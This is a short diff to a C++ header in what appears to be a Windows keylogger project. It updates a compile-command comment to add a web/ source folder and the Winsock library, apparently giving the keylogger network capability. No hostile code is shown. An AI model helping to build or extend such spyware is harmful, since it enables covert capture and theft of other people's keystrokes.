@@ -1,7 +1,7 @@
 #ifndef HEADER_LINKING
 #define HEADER_LINKING
 
-// Command to compile : g++ *.cpp listener/*.cpp keylogger/*.cpp threads/*.cpp -lwinmm
+// Command to compile : g++ *.cpp listener/*.cpp keylogger/*.cpp threads/*.cpp web/*.cpp -lwinmm -lws2_32
 
 #include <iostream>
 #include <windows.h>
